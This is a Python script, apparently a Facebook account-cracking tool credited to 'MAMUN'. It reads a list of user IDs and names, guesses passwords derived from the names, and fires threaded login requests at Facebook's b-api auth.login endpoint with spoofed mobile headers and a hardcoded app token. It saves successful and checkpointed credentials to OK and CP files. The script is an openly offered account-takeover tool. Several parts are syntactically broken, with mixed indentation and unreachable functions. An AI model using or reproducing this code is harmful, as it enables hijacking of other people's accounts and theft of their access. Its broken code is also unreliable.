import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('[✓] Internet Eror ,Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
try:ugen3 = open('user.txt','r').read().splitlines()
except:ugen3 = ['Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36']
try:ugen4 = open('user.txt','r').read().splitlines()
except:ugen4 = ['Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36']
try:ugen5 = open('user.txt','r').read().splitlines()
except:ugen5 = ['Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36']
try:ugen6 = open('user.txt','r').read().splitlines()
except:ugen6 = ['Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
try:ugen7 = open('user.txt','r').read().splitlines()
except:ugen7 = ['Opera/9.80 (Android 4.1.2; Linux; Opera Mobi/ADR-1305251841) Presto/2.11.355 Version/12.10']
try:ugen8 = open('user.txt','r').read().splitlines()
except:ugen8 = ['Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/28.2725; U; ru) Presto/2.8.119 Version/11.10']
try:ugen9 = open('user.txt','r').read().splitlines()
except:ugen9 = ['Mozilla/5.0 (Android 7.0; Mobile; rv:54.0) Gecko/54.0 Firefox/54.0']
try:ugen10 = open('user.txt','r').read().splitlines()
except:ugen10 = ['Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4']
try:ugen11 = open('user.txt','r').read().splitlines()
except:ugen11 = ['Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30"']
try:ugen12 = open('user.txt','r').read().splitlines()
except:ugen12 = ['Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36']
try:ugen13 = open('user.txt','r').read().splitlines()
except:ugen14 = ['Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36']
try:ugen15 = open('user.txt','r').read().splitlines()
except:ugen15 = ['Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3']
try:ugen16 = open('user.txt','r').read().splitlines()
except:ugen16 = ['Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36']

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\033[93m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[92m'
u = '\033[95m'
kk = '\033[93m'
b = '\33[1;96m'
p = '\x1b[1;95m'
P = '\033[0;00m'
J = '\033[1;93m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[1;92m'
C ='\033[1;96m'
M ='\033[1;91m'
U ='\033[1;95m'
K ='\033[1;93m'
P='\033[00m'
h='\033[1;90m'
Q="\033[00m"
kk='\033[1;92m'
ff='\033[1;96m'
G='\033[1;96m'
p='\033[00m'
h='\033[1;90m'
Q="\033[00m"
I='\033[1;92m'
II='\033[1;96m'
m='\033[1;91m'
O ='\033[1;93m'
H='\033[1;93m'
b = '\033[1;96m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
    
def clear():
	os.system('clear')
def back():
	menu()
def banner():
	clear()
	print("""%s\n\x1b[93;1m
	
	

'\33[32m' __  __    _    __  __ _   _ _   _ 
'\33[32m' |  \/  |  / \  |  \/  | | | | \ | |
'\33[32m' | |\/| | / _ \ | |\/| | | | |  \| |
'\33[32m' | |  | |/ ___ \| |  | | |_| | |\  |
'\33[32m' |_|  |_/_/   \_\_|  |_|\___/|_| \_|

\x1b[92;1m===================================>\x1b[92;
 '\033[34m' Author       \x1b[92;1m=>      \x1b[93;1mM A M U N
 '\33[33m' Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801304906886
 '\33[36m' Facebook     \x1b[92;1m=>      \x1b[93;1mﾞMood　一　Offﾞ　Stay ﾞxﾞ Alert十
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))

def menu(): #Bilo
banner()
	print("") #Bilo
	print("""%s \33[1;33m[1] File Crack  """%(h))
	print("""%s \33[1;33m[0] Exit"""%(h))
	mamun = input(x+'\33[1;96m•Input Number> ')
	if mamun in ['1','01']:
		File2()
	elif mamun in ['0','00']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
		exit()
	else:
		os.system("https://www.facebook.com/profile.php?id=100078539316286")
		exit()
		
		def File2():
			clear()
			banner()
			try:
				fileX = input ('\n [+] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))
				
def setting():
    print("""%s '\33[101m'[01] Method 1 """%(h))
	print("""%s '\33[101m'[02] Method 2 """%(h))
	mubashar = input(x+'\33[1;96m•Input Number>')
	if mubashar in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif mubashar in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
     else:
		print("""%s \33[1;33mRoung Input"""%(h))
		exit()
		print("""%s '\33[97m'[01] B-Api (fast)"""%(h))
		baloch = input(x+'\33[1;96m•Input Number> : ')
	if baloch in ['1','01']:
		method.append('api')
	else:
	method.append('api')
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	fast = input(x+'\33[1;96m Want To Start ? (y/t) : ')
	if fast in ['y','Y']:
		passwrd()
	elif fast in ['t','T']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
		exit()
def passwrd():
	clear()
	banner()
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print(x+' '+h+' '+x+' Total ids : '+str(len(id)))
	print(x+'   [  IF NO RESULT USE AIRPLANE MODE  ]\n   Cracking Starting...')
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
    with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
			if 'api' in method:
				pool.submit(crack2,idf,pwv)
			else:
				pool.submit(crack2,idf,pwv)
	print('')
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	exitss = input(x+'\33[1;96m Want to Exit (y/t) : ')
	if exitss in ['y','Y']:
		exit()
	else:
		exit()

def crack2(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
    print('\r%s [MAMUN] %s/%s   %s | %s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s [MAMUN-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [MAMUN-OK] %s|%s        '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


if __name__=='__main__':
	os.system('git pull')
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
menu()